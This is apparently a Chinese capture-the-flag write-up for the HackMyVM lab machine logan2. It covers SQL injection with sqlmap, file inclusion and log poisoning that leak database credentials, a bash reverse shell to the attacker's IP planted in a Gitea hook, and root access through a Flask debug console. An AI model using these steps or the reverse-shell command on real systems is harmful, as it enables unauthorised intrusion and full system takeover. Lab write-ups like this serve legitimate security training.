# hmv_logan2

# 0.简介

**靶机**：[hackmyvm - logan2](https://hackmyvm.eu/machines/machine.php?vm=logan2)
**难度**：黄色
**目标 IP**：192.168.205.144
**本机 IP**：192.168.205.141

# 1.扫描

`nmap`起手

```
┌──(kali㉿kali)-[~/test]
└─$ nmap -sS --min-rate 10000 -p- -Pn -sV 192.168.205.144
Starting Nmap 7.95 ( https://nmap.org ) at 2025-01-20 16:59 CST
Nmap scan report for 192.168.205.144
Host is up (0.00045s latency).
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.2p1 Debian 2 (protocol 2.0)
80/tcp   open  http    Apache httpd 2.4.57 ((Debian))
3000/tcp open  http    Golang net/http server
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port3000-TCP:V=7.95%I=7%D=1/20%Time=678E107B%P=x86_64-pc-linux-gnu%r(Ge
SF:nericLines,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20t
SF:ext/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x
SF:20Request")%r(GetRequest,1000,"HTTP/1\.0\x20200\x20OK\r\nContent-Type:\
SF:x20text/html;\x20charset=UTF-8\r\nSet-Cookie:\x20lang=en-US;\x20Path=/;
SF:\x20Max-Age=2147483647\r\nSet-Cookie:\x20i_like_gitea=abfb225a6c69b259;
SF:\x20Path=/;\x20HttpOnly\r\nSet-Cookie:\x20_csrf=1KgRX_Fci-rGge6j5LIyElk
SF:Aqp46MTczNzM2MzU3ODgyMTcyMjg4Mg;\x20Path=/;\x20Expires=Tue,\x2021\x20Ja
SF:n\x202025\x2008:59:38\x20GMT;\x20HttpOnly\r\nX-Frame-Options:\x20SAMEOR
SF:IGIN\r\nDate:\x20Mon,\x2020\x20Jan\x202025\x2008:59:38\x20GMT\r\n\r\n<!
SF:DOCTYPE\x20html>\n<html\x20lang=\"en-US\"\x20class=\"theme-\">\n<head\x
SF:20data-suburl=\"\">\n\t<meta\x20charset=\"utf-8\">\n\t<meta\x20name=\"v
SF:iewport\"\x20content=\"width=device-width,\x20initial-scale=1\">\n\t<me
SF:ta\x20http-equiv=\"x-ua-compatible\"\x20content=\"ie=edge\">\n\t<title>
SF:\x20Gitea:\x20Git\x20with\x20a\x20cup\x20of\x20tea\x20</title>\n\t<link
SF:\x20rel=\"manifest\"\x20href=\"/manifest\.json\"\x20crossorigin=\"use-c
SF:redentials\">\n\t<meta\x20name=\"theme-color\"\x20content=\"#6cc644\">\
SF:n\t<meta\x20name=\"author\"\x20content=\"Gitea\x20-\x20Git\x20with\x20a
SF:\x20cup\x20of\x20tea\"\x20/>\n\t<meta\x20name=\"description\"\x20conten
SF:t=\"Gitea\x20\(Git\x20with\x20a\x20cup\x20of\x20tea\)\x20is\x20a\x20pai
SF:nless")%r(Help,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\
SF:x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20B
SF:ad\x20Request")%r(HTTPOptions,1000,"HTTP/1\.0\x20404\x20Not\x20Found\r\
SF:nContent-Type:\x20text/html;\x20charset=UTF-8\r\nSet-Cookie:\x20lang=en
SF:-US;\x20Path=/;\x20Max-Age=2147483647\r\nSet-Cookie:\x20i_like_gitea=aa
SF:35213287ba9b56;\x20Path=/;\x20HttpOnly\r\nSet-Cookie:\x20_csrf=ibf5qw0V
SF:W54yX8vVkKfbkR8gck06MTczNzM2MzU3ODgzNzkzMjYzOA;\x20Path=/;\x20Expires=T
SF:ue,\x2021\x20Jan\x202025\x2008:59:38\x20GMT;\x20HttpOnly\r\nX-Frame-Opt
SF:ions:\x20SAMEORIGIN\r\nDate:\x20Mon,\x2020\x20Jan\x202025\x2008:59:38\x
SF:20GMT\r\n\r\n<!DOCTYPE\x20html>\n<html\x20lang=\"en-US\"\x20class=\"the
SF:me-\">\n<head\x20data-suburl=\"\">\n\t<meta\x20charset=\"utf-8\">\n\t<m
SF:eta\x20name=\"viewport\"\x20content=\"width=device-width,\x20initial-sc
SF:ale=1\">\n\t<meta\x20http-equiv=\"x-ua-compatible\"\x20content=\"ie=edg
SF:e\">\n\t<title>Page\x20Not\x20Found\x20-\x20\x20Gitea:\x20Git\x20with\x
SF:20a\x20cup\x20of\x20tea\x20</title>\n\t<link\x20rel=\"manifest\"\x20hre
SF:f=\"/manifest\.json\"\x20crossorigin=\"use-credentials\">\n\t<meta\x20n
SF:ame=\"theme-color\"\x20content=\"#6cc644\">\n\t<meta\x20name=\"author\"
SF:\x20content=\"Gitea\x20-\x20Git\x20with\x20a\x20cup\x20of\x20tea\"\x20/
SF:>\n\t<meta\x20name=\"description\"\x20content=\"Gitea\x20\(Git\x20with\
SF:x20a\x20c");
MAC Address: 08:00:27:B1:96:9A (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 27.94 seconds

```

80、3000都是http服务

# 2.踩点

80是欢迎页，有一个脚本。3000是Gitea通常没洞，所以我们先看脚本

```bash
http://192.168.205.144/script.js

document.addEventListener("DOMContentLoaded", function() {
    fetch('/save-user-agent.php', {
        method: 'POST',
        body: JSON.stringify({ user_agent: navigator.userAgent }),
        headers: {
            'Content-Type': 'application/json'
        }
    })
    .then(response => {
        if (response.ok) {
            console.log('User-Agent saved successfully.');
        } else {
            console.error('Error saving User-Agent.');
        }
    })
    .catch(error => {
        console.error('Network error:', error);
    });
});

```

意思是它user_agent可以以json传点东西，开个burp试试

![Image](https://github.com/user-attachments/assets/7eda310a-cb6a-4253-bcfc-7d775b7c4564)

sql注一下看有没有东西

```bash
┌──(kali㉿kali)-[~/test/tmp]
└─$ sqlmap -r sql.txt --batch
        ___
       __H__                                                                                                                         
 ___ ___[,]_____ ___ ___  {1.9#stable}                                                                                                 
|_ -| . [,]     | .'| . |                                                                                                            
|___|_  [']_|_|_|__,|  _|                                                                                                            
      |_|V...       |_|   https://sqlmap.org                                                                                         

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 17:10:23 /2025-01-20/

[17:10:23] [INFO] parsing HTTP request from 'sql.txt'
JSON-like data found in GET body. Do you want to process it? [Y/n/q] Y
Cookie parameter '_csrf' appears to hold anti-CSRF token. Do you want sqlmap to automatically update it in further requests? [y/N] N
[17:10:23] [INFO] testing connection to the target URL
[17:10:23] [INFO] testing if the target URL content is stable
[17:10:23] [ERROR] there was an error checking the stability of page because of lack of content. Please check the page request results (and probable errors) by using higher verbosity levels
[17:10:23] [INFO] testing if (custom) POST parameter 'JSON-like user_agent' is dynamic
[17:10:23] [WARNING] (custom) POST parameter 'JSON-like user_agent' does not appear to be dynamic
[17:10:23] [WARNING] heuristic (basic) test shows that (custom) POST parameter 'JSON-like user_agent' might not be injectable
[17:10:23] [INFO] testing for SQL injection on (custom) POST parameter 'JSON-like user_agent'
[17:10:24] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[17:10:24] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[17:10:24] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[17:10:24] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
[17:10:24] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'
[17:10:24] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'
[17:10:24] [INFO] testing 'Generic inline queries'
[17:10:24] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
[17:10:24] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'
[17:10:24] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'
[17:10:24] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[17:10:24] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'
[17:10:24] [INFO] testing 'Microsoft SQL Server/Sybase time-based blind (IF)'
[17:10:24] [INFO] testing 'Oracle AND time-based blind'
it is recommended to perform only basic UNION tests if there is not at least one other (potential) technique found. Do you want to reduce the number of requests? [Y/n] Y
[17:10:24] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
[17:10:24] [WARNING] (custom) POST parameter 'JSON-like user_agent' does not seem to be injectable
[17:10:24] [CRITICAL] all tested parameters do not appear to be injectable. Try to increase values for '--level'/'--risk' options if you wish to perform more tests. If you suspect that there is some kind of protection mechanism involved (e.g. WAF) maybe you could try to use option '--tamper' (e.g. '--tamper=space2comment') and/or switch '--random-agent'

[*] ending @ 17:10:24 /2025-01-20/


```

不行，自己写一个试试

```bash
┌──(kali㉿kali)-[~/test/tmp]
└─$ sqlmap --url http://192.168.205.144/save-user-agent.php --method POST --data '{"user_agent":"1"}' --batch --current-db 
        ___
       __H__                                                                                                                         
 ___ ___[']_____ ___ ___  {1.9#stable}                                                                                               
|_ -| . [)]     | .'| . |                                                                                                            
|___|_  [(]_|_|_|__,|  _|                                                                                                            
      |_|V...       |_|   https://sqlmap.org                                                                                         

省略
[17:17:19] [INFO] adjusting time delay to 1 second due to good response times
logan
current database: 'logan'

┌──(kali㉿kali)-[~/test/tmp]
└─$ sqlmap --url http://192.168.205.144/save-user-agent.php --method POST --data '{"user_agent":"1"}' --batch -D logan --tables     
        ___
       __H__                                                                                                                         
 ___ ___[(]_____ ___ ___  {1.9#stable}                                                                                                 
|_ -| . [(]     | .'| . |                                                                                                            
|___|_  [']_|_|_|__,|  _|                                                                                                            
      |_|V...       |_|   https://sqlmap.org                                                                                         

省略
[17:26:42] [INFO] adjusting time delay to 1 second due to good response times
3
[17:26:42] [INFO] retrieved: browser
[17:27:04] [INFO] retrieved: comments
[17:27:30] [INFO] retrieved: users
Database: logan
[3 tables]
+----------+
| browser  |
| comments |
| users    |
+----------+


┌──(kali㉿kali)-[~/test/tmp]
└─$ sqlmap --url http://192.168.205.144/save-user-agent.php --method POST --data '{"user_agent":"1"}' --batch -D logan -T users --dump
        ___
       __H__                                                                                                                         
 ___ ___[.]_____ ___ ___  {1.9#stable}                                                                                                 
|_ -| . [)]     | .'| . |                                                                                                            
|___|_  [(]_|_|_|__,|  _|                                                                                                            
      |_|V...       |_|   https://sqlmap.org                                                                                         

省略
Database: logan
Table: users
[1 entry]
+------------------------------+--------+
| email                        | user   |
+------------------------------+--------+
| logan@newsitelogan.logan.hmv | logan  |
+------------------------------+--------+

```

只有一个用户名和域名，我们将域名加上

![Image](https://github.com/user-attachments/assets/6d62fde8-9b9e-47e5-8861-1658bae184b2)

试试有没有文件包含

![Image](https://github.com/user-attachments/assets/9660a109-bcae-4ede-ba5f-2ccf553a07ea)

存在文件包含，尝试读取密钥，无果。看看存不存在日志注入

![Image](https://github.com/user-attachments/assets/3b1e466f-27cd-404c-a5cc-e812af4e6cee)

存在，尝试注入

![Image](https://github.com/user-attachments/assets/c15708fd-3b31-4bc3-8778-6dc9da12fe2b)

嘻嘻

![Image](https://github.com/user-attachments/assets/d6647484-800d-4bf2-98c7-09e15435ff1c)

不嘻嘻，容易的都给它禁了

![Image](https://github.com/user-attachments/assets/43e262e5-1441-4451-a648-11601dbdd8d7)

还一分钟清一次，考验手速是吧？

![Image](https://github.com/user-attachments/assets/837e96ef-975c-44b9-a745-42b61d73363a)

![Image](https://github.com/user-attachments/assets/57f4d48e-140e-4f6a-a9da-87a65a12bccd)

```bash
┌──(kali㉿kali)-[~/test]
└─$ echo 'PD9waHAKCQoJJHNlcnZlcm5hbWUgPSAibG9jYWxob3N0IjsKCSR1c2VybmFtZSA9ICJsb2dhbiI7CgkkcGFzc3dvcmQgPSAiU3VwZXJfbG9nYW4xMjM0IjsKCSRkYm5hbWUgPSAibG9nYW4iOwoKCS8vIENyZWF0ZSBjb25uZWN0aW9uCgkkY29ubiA9IG5ldyBteXNxbGkoJHNlcnZlcm5hbWUsICR1c2VybmFtZSwgJHBhc3N3b3JkLCAkZGJuYW1lKTsKCS8vIENoZWNrIGNvbm5lY3Rpb24KCWlmICgkY29ubi0+Y29ubmVjdF9lcnJvcikgewoJICBkaWUoIkNvbm5lY3Rpb24gZmFpbGVkOiAiIC4gJGNvbm4tPmNvbm5lY3RfZXJyb3IpOwoJfQoKPz4K' |base64 -d
<?php

        $servername = "localhost";
        $username = "logan";
        $password = "Super_logan1234";
        $dbname = "logan";

        // Create connection
        $conn = new mysqli($servername, $username, $password, $dbname);
        // Check connection
        if ($conn->connect_error) {
          die("Connection failed: " . $conn->connect_error);
        }

?>

```

登录Gitea

![Image](https://github.com/user-attachments/assets/87309749-0e27-4dc1-bf6a-09cb1b54d57c)

改个shell上去

```bash
#!/bin/sh
bash -c "bash -i >& /dev/tcp/192.168.205.141/8888 0>&1"
省略
```

交个文件上去

![Image](https://github.com/user-attachments/assets/e9aaf4dc-fb75-4f1c-98d5-583ffdd77f4a)

```bash
┌──(kali㉿kali)-[~/test]
└─$ nc -lvnp 8888
listening on [any] 8888 ...
connect to [192.168.205.141] from (UNKNOWN) [192.168.205.144] 55202
bash: cannot set terminal process group (428): Inappropriate ioctl for device
bash: no job control in this shell
git@logan2:~/gitea-repositories/logan/future_web.git$ id
id
uid=104(git) gid=113(git) groups=113(git)
```

# 3. 获得稳定的 Shell

获取**反向 shell** 后，通过以下命令获得稳定的**交互式** **TTY shell**：

```bash
script /dev/null -c bash  
ctrl+z  
stty raw -echo; fg  
reset xterm  
export TERM=xterm  
echo $SHELL  
export SHELL=/bin/bash  
stty rows 59 cols 236
```

# 4.提权

```bash
git@logan2:~/gitea-repositories/logan/future_web.git$ sudo -l
Matching Defaults entries for git on logan2:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User git may run the following commands on logan2:
    (ALL) NOPASSWD: /usr/bin/python3 /opt/app.py
git@logan2:~/gitea-repositories/logan/future_web.git$ ls -la /opt/app.py
ls: cannot access '/opt/app.py': Permission denied
git@logan2:~/gitea-repositories/logan/future_web.git$ cd /home/
git@logan2:/home$ ls -al
total 20
drwxr-xr-x  5 root  root  4096 Sep 11  2023 .
drwxr-xr-x 18 root  root  4096 Aug 27  2023 ..
drwxr-xr-x  4 git   git   4096 Jan 20 02:58 git
drwx------  2 kevin kevin 4096 Sep 11  2023 kevin
drwx------  3 logan logan 4096 Sep 11  2023 logan
git@logan2:/home$ cd git/
git@logan2:~$ ls -al
total 20
drwxr-xr-x 4 git  git  4096 Jan 20 02:58 .
drwxr-xr-x 5 root root 4096 Sep 11  2023 ..
-rw-r--r-- 1 git  git   123 Jan 20 02:58 .gitconfig
drwx------ 2 git  git  4096 Aug 27  2023 .ssh
drwxr-xr-x 3 git  git  4096 Sep 11  2023 gitea-repositories
git@logan2:~$ cd /tmp/
git@logan2:/tmp$ ls -al
total 32
drwxrwxrwt  8 root root 4096 Jan 20 03:53 .
drwxr-xr-x 18 root root 4096 Aug 27  2023 ..
drwxrwxrwt  2 root root 4096 Jan 20 02:58 .ICE-unix
drwxrwxrwt  2 root root 4096 Jan 20 02:58 .X11-unix
drwxrwxrwt  2 root root 4096 Jan 20 02:58 .XIM-unix
drwxrwxrwt  2 root root 4096 Jan 20 02:58 .font-unix
drwx------  3 root root 4096 Jan 20 02:58 systemd-private-0d3aa9413d3b439bb9007bce25456a9d-apache2.service-ZTwD9s
drwx------  3 root root 4096 Jan 20 02:58 systemd-private-0d3aa9413d3b439bb9007bce25456a9d-systemd-logind.service-6lKqu3
git@logan2:/tmp$ cd /mnt/
git@logan2:/mnt$ ls -al
total 8
drwxr-xr-x  2 root root 4096 Aug 27  2023 .
drwxr-xr-x 18 root root 4096 Aug 27  2023 ..
git@logan2:/mnt$ cd /tmp/
git@logan2:/tmp$ find / -perm -4000 -type f 2>/dev/null
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/bin/su
/usr/bin/gpasswd
/usr/bin/umount
/usr/bin/chsh
/usr/bin/sudo
/usr/bin/mount
/usr/bin/passwd
/usr/bin/newgrp
/usr/bin/chfn
git@logan2:/tmp$ /sbin/getcap -r / 2>/dev/null
/usr/bin/ping cap_net_raw=ep
git@logan2:/tmp$ ss -tuln | grep tcp
tcp   LISTEN 0      80         127.0.0.1:3306      0.0.0.0:*        
tcp   LISTEN 0      128          0.0.0.0:22        0.0.0.0:*        
tcp   LISTEN 0      128             [::]:22           [::]:*        
tcp   LISTEN 0      511                *:80              *:*        
tcp   LISTEN 0      4096               *:3000            *:*        
git@logan2:/tmp$ sudo -l
Matching Defaults entries for git on logan2:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User git may run the following commands on logan2:
    (ALL) NOPASSWD: /usr/bin/python3 /opt/app.py
git@logan2:/tmp$ sudo /usr/bin/python3 /opt/app.py
 * Serving Flask app 'app'
 * Debug mode: on
WARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.
 * Running on all addresses (0.0.0.0)
 * Running on http://127.0.0.1:8000
 * Running on http://192.168.205.144:8000
Press CTRL+C to quit
 * Restarting with stat
 * Debugger is active!
 * Debugger PIN: 632-008-714

```

熟悉的配方，那就简单了（PIN都给了Debugger PIN: 632-008-714）

![Image](https://github.com/user-attachments/assets/ac3d324c-42a9-4b48-8e1a-999bb899c0e9)

```bash
┌──(kali㉿kali)-[~/test]
└─$ nc -lvnp 8889                                  
listening on [any] 8889 ...
connect to [192.168.205.141] from (UNKNOWN) [192.168.205.144] 58630
root@logan2:/tmp# id
id
uid=0(root) gid=0(root) groups=0(root)

```